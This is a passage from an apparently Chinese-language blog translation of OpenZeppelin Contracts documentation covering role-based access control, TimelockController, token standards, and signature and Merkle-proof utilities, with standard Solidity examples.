DAO</a> 或您创建的完全自定义合约打开了大门。</p><p>通过这种方式，您可以使用可组合性(<em>composability</em>)为您的合约添加额外的访问控制复杂性层。例如，您可以使用由项目负责人运行的 2-of-3 多重签名，而不是将单个常规以太坊账户（外部拥有的账户，或 EOA）作为所有者。该领域的知名项目，例如 <a href="https://makerdao.com/">MakerDAO</a>，使用与此类似的系统。</p><h3 id="Role-Based-Access-Control"><a href="#Role-Based-Access-Control" class="headerlink" title="Role-Based Access Control"></a>Role-Based Access Control</h3><p>虽然 <code>ownership</code> 的简单性对于简单的系统或快速原型设计很有用，但通常需要不同级别的授权。您可能希望帐户有权禁止用户进入系统，但不能创建新代币。<a href="https://en.wikipedia.org/wiki/Role-based_access_control"><em>Role-Based Access Control (RBAC)</em></a> 在这方面提供了灵活性。</p><p>本质上，我们将定义多个角色，每个角色都允许执行不同的操作集。例如，一个帐户可能具有“moderator”、“minter”或“admin”角色，然后您将检查这些角色，而不是简单地使用 <code>onlyOwner</code>。可以通过 <code>onlyRole</code> 修饰符强制执行此检查。另外，您将能够定义如何向帐户授予角色、撤销角色等规则。</p><p>大多数软件使用基于角色的访问控制系统：一些用户是普通用户，一些可能是主管(supervisor)或经理(manager)，还有一些通常具有管理权限。</p><h3 id="Using-AccessControl"><a href="#Using-AccessControl" class="headerlink" title="Using AccessControl"></a>Using <code>AccessControl</code></h3><p>OpenZeppelin Contracts 为实现基于角色的访问控制提供了 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl"><code>AccessControl</code></a>。它的用法很简单：对于您要定义的每个角色，您将创建一个新的角色标识符(<em>role identifier</em>)，用于授予(grant)、撤销(revoke)和检查(check)帐户是否具有该角色。</p><p>这是一个在 <a href="https://docs.openzeppelin.com/contracts/4.x/tokens#ERC20"><code>ERC20</code> token</a> 中使用 <code>AccessControl</code> 来定义“minter”角色的简单示例，该角色允许拥有它的帐户创建新的 token：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/MyToken.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/AccessControl.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyToken</span> <span class="token keyword">is</span> ERC20<span class="token punctuation">,</span> AccessControl <span class="token punctuation">&#123;</span>    <span class="token comment">// Create a new role identifier for the minter role</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> MINTER_ROLE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"MINTER_ROLE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> minter<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"MyToken"</span><span class="token punctuation">,</span> <span class="token string">"TKN"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Grant the minter role to a specified account</span>        <span class="token function">_setupRole</span><span class="token punctuation">(</span>MINTER_ROLE<span class="token punctuation">,</span> minter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Check that the calling account has the minter role</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">hasRole</span><span class="token punctuation">(</span>MINTER_ROLE<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Caller is not a minter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>NOTE：在您的系统上使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl"><code>AccessControl</code></a>  或复制粘贴本指南中的示例之前，请确保您完全了解其工作原理。</p><p>虽然清晰明确，但这并不是我们使用 <code>Ownable</code> 无法实现的。事实上，<code>AccessControl</code> 的亮点在于需要细粒度权限的场景，这可以通过定义多个角色来实现。</p><p>让我们通过定义一个“burner”角色来扩充我们的 ERC20 代币示例，该角色允许帐户销毁代币，并使用 <code>onlyRole</code> 修饰符：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/MyToken.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/AccessControl.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyToken</span> <span class="token keyword">is</span> ERC20<span class="token punctuation">,</span> AccessControl <span class="token punctuation">&#123;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> MINTER_ROLE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"MINTER_ROLE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> BURNER_ROLE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"BURNER_ROLE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> minter<span class="token punctuation">,</span> <span class="token builtin">address</span> burner<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"MyToken"</span><span class="token punctuation">,</span> <span class="token string">"TKN"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_setupRole</span><span class="token punctuation">(</span>MINTER_ROLE<span class="token punctuation">,</span> minter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_setupRole</span><span class="token punctuation">(</span>BURNER_ROLE<span class="token punctuation">,</span> burner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">onlyRole</span><span class="token punctuation">(</span>MINTER_ROLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">burn</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">onlyRole</span><span class="token punctuation">(</span>BURNER_ROLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_burn</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>多干净！通过这种方式拆分关注点，可以实现比使用更简单的 <em>ownership</em> 方法进行访问控制更细化的权限级别。限制系统的每个组件能够执行的操作被称为 <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">最小权限原则</a>，并且是一种良好的安全实践。请注意，如果需要，每个帐户可能仍具有多个角色。</p><h3 id="Granting-and-Revoking-Roles"><a href="#Granting-and-Revoking-Roles" class="headerlink" title="Granting and Revoking Roles"></a>Granting and Revoking Roles</h3><p>上面的 ERC20 token 示例使用 <code>_setupRole</code>，这是一个 <code>internal</code> 函数，在以编程方式分配角色时（例如在构造期间）很有用。但是，如果我们稍后想将“minter”角色授予其他帐户怎么办？</p><p>默认情况下，<strong>具有角色的帐户无法从其他帐户授予或撤销它</strong>：拥有角色所做的只是使 <code>hasRole</code> 检查通过。要动态授予和撤销角色，您需要角色管理员(<em>role’s admin</em>)的帮助。</p><p>每个角色都有一个关联的管理员角色，该角色授予调用 <code>grantRole</code> 和 <code>revokeRole</code> 函数的权限。如果调用帐户具有相应的管理员角色，则可以使用这些来授予或撤销角色。多个角色可能具有相同的管理员角色，以便于管理。一个角色的管理员甚至可以是同一个角色本身，这将导致具有该角色的帐户也能够授予和撤销它。</p><p>这种机制可用于创建类似于组织结构图的复杂许可结构，但它也提供了一种管理简单应用程序的简单方法。 <code>AccessControl</code> 包含一个特殊角色，称为 <code>DEFAULT_ADMIN_ROLE</code>，它充当<strong>所有角色的默认管理员角色</strong>。具有此角色的帐户将能够管理任何其他角色，除非 <code>_setRoleAdmin</code> 用于选择新的管理员角色。</p><p>让我们看一下 ERC20 代币示例，这一次利用了默认管理员角色：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/MyToken.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/AccessControl.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyToken</span> <span class="token keyword">is</span> ERC20<span class="token punctuation">,</span> AccessControl <span class="token punctuation">&#123;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> MINTER_ROLE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"MINTER_ROLE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> BURNER_ROLE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"BURNER_ROLE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"MyToken"</span><span class="token punctuation">,</span> <span class="token string">"TKN"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Grant the contract deployer the default admin role: it will be able</span>        <span class="token comment">// to grant and revoke any roles</span>        <span class="token function">_setupRole</span><span class="token punctuation">(</span>DEFAULT_ADMIN_ROLE<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">onlyRole</span><span class="token punctuation">(</span>MINTER_ROLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">burn</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">onlyRole</span><span class="token punctuation">(</span>BURNER_ROLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_burn</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，与前面的示例不同，没有帐户被授予“minter”或“burner”角色。但是，由于这些角色的管理员角色是默认管理员角色，并且该角色已授予 <code>msg.sender</code>，因此同一帐户可以调用 <code>grantRole</code> 授予铸币或销毁权限，也可以调用 <code>revokeRole</code> 将其删除。</p><p>动态角色分配通常是理想的属性，例如在对参与者的信任可能随时间变化的系统中。它还可用于支持诸如 <a href="https://en.wikipedia.org/wiki/Know_your_customer">KYC</a> 之类的用例，其中角色承担者的列表可能事先不知道，或者包含在单个交易中可能过于昂贵。</p><h3 id="Querying-Privileged-Accounts"><a href="#Querying-Privileged-Accounts" class="headerlink" title="Querying Privileged Accounts"></a>Querying Privileged Accounts</h3><p>由于帐户可能会动态<a href="https://docs.openzeppelin.com/contracts/4.x/access-control#granting-and-revoking">授予和撤销角色</a>，因此并不总是可以确定哪些帐户拥有特定角色。这很重要，因为它可以证明系统的某些属性，例如管理帐户是多重签名或 DAO，或者某个角色已从所有用户中删除，从而有效地禁用任何相关功能。</p><p>在底层，<code>AccessControl</code> 使用 <code>EnumerableSet</code>，这是 Solidity <code>mapping</code> 类型的一个更强大的变体，它允许键枚举。 <code>getRoleMemberCount</code> 可用于检索具有特定角色的帐户的数量，然后可以调用 <code>getRoleMember</code> 来获取每个帐户的地址。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> minterCount <span class="token operator">=</span> <span class="token keyword">await</span> myToken<span class="token punctuation">.</span><span class="token function">getRoleMemberCount</span><span class="token punctuation">(</span><span class="token constant">MINTER_ROLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> members <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> minterCount<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    members<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">await</span> myToken<span class="token punctuation">.</span><span class="token function">getRoleMember</span><span class="token punctuation">(</span><span class="token constant">MINTER_ROLE</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="Delayed-operation"><a href="#Delayed-operation" class="headerlink" title="Delayed operation"></a>Delayed operation</h3><p>访问控制对于防止未经授权访问关键函数来说至关重要。这些函数可用于铸造代币、冻结转账或执行完全改变智能合约逻辑的升级。虽然 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable"><code>Ownable</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl"><code>AccessControl</code></a> 可以防止未经授权的访问，但它们并没有解决行为不端的管理员攻击他们自己的系统以损害其用户的问题。</p><p>这是 <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController"><code>TimelockController</code></a> 正在解决的问题。</p><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController"><code>TimelockController</code></a> 是由提议者(proposer)和执行者(executor)管理的代理。当设置为智能合约的所有者(owner)&#x2F;管理员(admin)&#x2F;控制者(controller)时，它确保提议者下令的任何维护操作都会受到延迟。这种延迟保护了智能合约的用户，让他们有时间审查维护操作并在他们认为这样做最符合他们利益的情况下退出系统。</p><h3 id="Using-TimelockController"><a href="#Using-TimelockController" class="headerlink" title="Using TimelockController"></a>Using <code>TimelockController</code></h3><p>默认情况下，部署了 <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController"><code>TimelockController</code></a> 的地址获得对时间锁的管理权限。此角色授予指定提议者、执行者和其他管理员的权利。</p><p>配置 <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController"><code>TimelockController</code></a> 的第一步是至少分配一个提议者和一个执行者。这些可以在构建期间或以后由具有管理员角色的任何人分配。这些角色不是独占的，这意味着一个帐户可以同时拥有这两个角色。</p><p>角色由 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl"><code>AccessControl</code></a> 接口管理，每个角色的 <code>bytes32</code> 值可通过 <code>ADMIN_ROLE</code>、<code>PROPOSER_ROLE</code> 和 <code>EXECUTOR_ROLE</code> 常量访问。</p><p>在 <code>AccessControl</code> 之上构建了一个附加特性：将执行者角色赋予 <code>address(0)</code> 可以在时间锁到期后向任何人开放执行提案的权限。此功能虽然有用，但应谨慎使用。</p><p>此时，同时分配了提议者和执行者，时间锁就可以执行操作了。</p><p>可选的下一步是部署者放弃其管理权限并让时间锁自行管理。如果部署者决定这样做，所有进一步的维护，包括分配新的提议者&#x2F;调度者或更改时间锁持续时间都必须遵循时间锁工作流程。这将时间锁的治理与附加到时间锁的合约的治理联系起来，并强制延迟时间锁维护操作。</p><p>WARNING：如果部署者放弃管理权限以支持 timelock 本身，则分配新的提议者或执行者将需要 timelocked 操作。这意味着，如果负责这两个角色中的任何一个的账户不可用，那么整个合约（以及它控制的任何合约）都会被无限期锁定。</p><p>通过分配提议者和执行者角色以及负责其自身管理的时间锁，您现在可以将任何合约的所有权&#x2F;控制权转移到时间锁。</p><p>TIP：推荐的配置是将这两个角色授予安全治理合约（例如 DAO 或多重签名），并将执行者角色授予负责帮助维护操作的人员持有的一些 EOA。这些钱包无法接管时间锁，但它们可以帮助简化工作流程。</p><h3 id="Minimum-delay"><a href="#Minimum-delay" class="headerlink" title="Minimum delay"></a>Minimum delay</h3><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController"><code>TimelockController</code></a> 执行的操作不受固定延迟的影响，而是最小延迟。一些主要更新可能需要更长的延迟。例如，如果仅仅几天的延迟可能足以让用户审核铸币操作，那么在安排智能合约升级时使用几周甚至几个月的延迟是有意义的。</p><p>可以通过调用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController-updateDelay-uint256-"><code>updateDelay</code></a>  函数来更新最小延迟（可通过 <a href="https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController-getMinDelay--"><code>getMinDelay</code></a>  方法访问）。请记住，只有时间锁本身才能访问此功能，这意味着此维护操作必须通过时间锁本身。</p><h2 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h2><p>啊，“代币”：区块链最强大也是最容易被误解的工具。</p><p><strong>代币是区块链中某物的表示。</strong>这可以是金钱、时间、服务、公司股份、虚拟宠物，任何东西。通过将事物表示为代币，我们可以允许智能合约与它们交互、交换、创建或销毁它们。</p><h4 id="But-First-Coffee-a-Primer-on-Token-Contracts"><a href="#But-First-Coffee-a-Primer-on-Token-Contracts" class="headerlink" title="But First, Coffee a Primer on Token Contracts"></a>But First, <del>Coffee</del> a Primer on Token Contracts</h4><p>围绕代币的大部分混淆来自于两个概念的混淆：代币合约(<em>token contracts</em>)和实际代币(<em>token</em>)。</p><p>代币合约只是一个以太坊智能合约。 “发送代币”实际上意味着“调用某人编写和部署的智能合约上的方法”。归根结底，代币合约只不过是地址到余额的映射，加上一些从这些余额中加减的方法。</p><p>正是这些余额代表了代币本身。当代币合约中的余额不为零时，某人“拥有代币”。That’s it！这些余额可以被视为金钱、游戏中的经验值、所有权契约或投票权，并且这些代币中的每一个都将存储在不同的代币合约中。</p><h4 id="Different-Kinds-of-Tokens"><a href="#Different-Kinds-of-Tokens" class="headerlink" title="Different Kinds of Tokens"></a>Different Kinds of Tokens</h4><p>请注意，拥有两个投票权和两个所有权契约之间有很大的区别：每个投票都等于所有其他投票，但房子通常不是！这称为可替代性(<a href="https://en.wikipedia.org/wiki/Fungibility">fungibility</a>)。可替代商品(<em>Fungible goods</em>)是等价且可互换的，例如以太币、法定货币和投票权。不可替代的(<em>Non-fungible</em>)商品是独一无二的，就像所有权契约或收藏品一样。</p><p>简而言之，在处理不可替代的资产（例如您的房子）时，您关心的是您拥有<em>哪些</em>资产，而在可替代资产（例如您的银行账户对账单）中，重要的是您拥有<em>多少</em>。</p><h4 id="Standards"><a href="#Standards" class="headerlink" title="Standards"></a>Standards</h4><p>尽管代币的概念很简单，但它们在实现中具有各种复杂性。因为以太坊中的一切都只是一个智能合约，并且没有关于智能合约必须做什么的规则，社区已经开发了各种<strong>标准</strong>（称为 EIP 或 ERC）来记录合约如何与其他合约互操作。</p><p>您可能听说过 ERC20 或 ERC721 代币标准，这就是您来这里的原因。前往我们的专业指南了解更多信息：</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20</a>：可替代资产最广泛的代币标准，尽管在某种程度上受到其简单性的限制。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc721">ERC721</a>：不可替代代币的实际解决方案，通常用于收藏品和游戏。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc777">ERC777</a>：更丰富的可替代代币标准，支持新的用例并建立在过去的学习基础上。向后兼容 ERC20。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc1155">ERC1155</a>：一种新的多代币标准，允许单个合约代表多个可替代和不可替代的代币，以及批量操作以提高gas效率。</li></ul><h3 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h3><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20 (OpenZeppelin Docs)</a></li></ul><h3 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h3><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc721">ERC721 (OpenZeppelin Docs)</a></li></ul><h3 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h3><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc777">ERC777 (OpenZeppelin Docs)</a></li></ul><h3 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h3><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/erc1155#sending-to-contracts">ERC1155 (OpenZeppelin Docs)</a></li></ul><h2 id="Governance"><a href="#Governance" class="headerlink" title="Governance"></a>Governance</h2><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/governance">How to set up on-chain governance (OpenZeppelin Docs)</a></li></ul><h2 id="CrossChain"><a href="#CrossChain" class="headerlink" title="CrossChain"></a>CrossChain</h2><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/crosschain">Adding cross-chain support to contracts (OpenZeppelin Docs)</a></li></ul><h2 id="Utilities"><a href="#Utilities" class="headerlink" title="Utilities"></a>Utilities</h2><p>OpenZeppelin Contracts 提供了大量有用的实用程序，您可以在项目中使用它们。这里有一些比较流行的。</p><h3 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h3><h4 id="Checking-Signatures-On-Chain"><a href="#Checking-Signatures-On-Chain" class="headerlink" title="Checking Signatures On-Chain"></a>Checking Signatures On-Chain</h4><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA"><code>ECDSA</code></a> 提供了恢复和管理以太坊账户 ECDSA 签名的功能。这些通常是通过 <a href="https://web3js.readthedocs.io/en/v1.7.3/web3-eth.html#sign"><code>web3.eth.sign</code></a> 生成的，是一个 65 字节的数组（Solidity 中的 <code>bytes</code> 类型），排列方式如下：<code>[[v (1)], [r (32)], [s (32)]]</code>。</p><p>可以使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-recover-bytes32-bytes-"><code>ECDSA.recover</code></a> 恢复数据签名者，并将其地址进行比较以验证签名。大多数钱包会对数据进行哈希签名并添加前缀“\x19Ethereum Signed Message:\n”，因此在尝试恢复以太坊签名消息哈希的签名者时，您需要使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-toEthSignedMessageHash-bytes32-"><code>toEthSignedMessageHash</code></a>。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">using</span> <span class="token class-name">ECDSA</span> <span class="token keyword">for</span> <span class="token builtin">bytes32</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_verify</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> data<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> signature<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> data        <span class="token punctuation">.</span><span class="token function">toEthSignedMessageHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">recover</span><span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">==</span> account<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>WARNING：正确进行签名验证并非易事：确保您完全阅读并理解 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA"><code>ECDSA</code></a> 的文档。</p><h4 id="Verifying-Merkle-Proofs"><a href="#Verifying-Merkle-Proofs" class="headerlink" title="Verifying Merkle Proofs"></a>Verifying Merkle Proofs</h4><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#MerkleProof"><code>MerkleProof</code></a> 提供：</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#MerkleProof-verify-bytes32---bytes32-bytes32-"><code>verify</code></a> - 可以证明某个值是 <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> 的一部分。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#MerkleProof-multiProofVerify-bytes32-bytes32---bytes32---bool---"><code>multiProofVerify</code></a> - 可以证明多个值是 Merkle 树的一部分。</li></ul><h3 id="Introspection"><a href="#Introspection" class="headerlink" title="Introspection"></a>Introspection</h3><p>在 Solidity 中，了解合约是否支持您想要使用的接口通常很有帮助。 ERC165 是一个有助于进行运行时接口检测的标准。合约为在你的合约中实现 ERC165 和查询其他合约提供了帮助：</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#IERC165"><code>IERC165</code></a> - 这是定义 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#IERC165-supportsInterface-bytes4-"><code>supportsInterface</code></a> 的 ERC165 接口。实现 ERC165 时，您将遵守此接口。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ERC165"><code>ERC165</code></a> - 如果您想使用合约存储中的查找表支持接口检测，请继承此合约。您可以使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ERC165-_registerInterface-bytes4-"><code>_registerInterface(bytes4)</code></a> 注册接口：查看示例用法作为 ERC721 实现的一部分。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ERC165Checker"><code>ERC165Checker</code></a> - ERC165Checker 简化了检查合约是否支持您关心的接口的过程。</li><li>包括使用 ERC165Checker 作为地址；</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ERC165Checker-_supportsInterface-address-bytes4-"><code>myAddress._supportsInterface(bytes4)</code></a></li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ERC165Checker-_supportsAllInterfaces-address-bytes4---"><code>myAddress._supportsAllInterfaces(bytes4[])</code></a></li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">MyContract</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">ERC165Checker</span> <span class="token keyword">for</span> <span class="token builtin">address</span><span class="token punctuation">;</span>    <span class="token builtin">bytes4</span> <span class="token keyword">private</span> InterfaceId_ERC721 <span class="token operator">=</span> <span class="token number">0x80ac58cd</span><span class="token punctuation">;</span>    <span class="token comment">/**     * @dev transfer an ERC721 token from this contract to someone else     */</span>    <span class="token keyword">function</span> <span class="token 